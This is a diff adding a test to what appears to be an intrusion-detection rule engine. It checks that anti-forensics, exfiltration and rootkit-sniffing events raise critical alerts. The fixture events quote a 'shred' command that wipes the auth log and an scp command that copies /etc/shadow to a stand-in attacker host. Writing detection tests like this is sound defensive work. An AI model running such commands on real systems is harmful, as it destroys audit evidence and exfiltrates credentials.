@@ -519,3 +519,44 @@ def test_cron_persistence_defense_evasion_and_key_tamper_rules(engine):
     assert rule_ids.get("RULE-SSH-KEY-BACKDOOR") == "critical"
 
 
+def test_defense_apt_anti_forensics_exfil_and_rootkit_rules(engine):
+    events = [
+        {
+            "id": "EVT-AF-1",
+            "host_id": "host-fenn",
+            "source_id": "auditd",
+            "event_type": "anti_forensics_execution",
+            "event_timestamp": "2026-11-07T11:30:00Z",
+            "source_ip": None,
+            "user_name": "ubuntu",
+            "details": {"matched_indicator": "shred", "command": "shred -u /var/log/auth.log"},
+        },
+        {
+            "id": "EVT-EXF-1",
+            "host_id": "host-fenn",
+            "source_id": "auditd",
+            "event_type": "data_exfiltration_attempt",
+            "event_timestamp": "2026-11-07T11:31:00Z",
+            "source_ip": "198.51.100.77",
+            "user_name": "ubuntu",
+            "details": {"exfil_stage": "network_transfer", "destination_ip": "198.51.100.77", "command": "scp /etc/shadow attacker@198.51.100.77:/tmp/"},
+        },
+        {
+            "id": "EVT-RK-1",
+            "host_id": "host-fenn",
+            "source_id": "auditd",
+            "event_type": "rootkit_or_sniff_activity",
+            "event_timestamp": "2026-11-07T11:32:00Z",
+            "source_ip": None,
+            "user_name": "kernel",
+            "details": {"activity_type": "promiscuous_sniffing", "interface": "eth0"},
+        },
+    ]
+    alerts, _ = engine.evaluate_events(events)
+    rule_ids = {a["rule_id"]: a["severity"] for a in alerts}
+    assert rule_ids.get("RULE-ANTI-FORENSICS") == "critical"
+    assert rule_ids.get("RULE-DATA-EXFIL") == "critical"
+    assert rule_ids.get("RULE-ROOTKIT-SNIFF") == "critical"
+
+
+
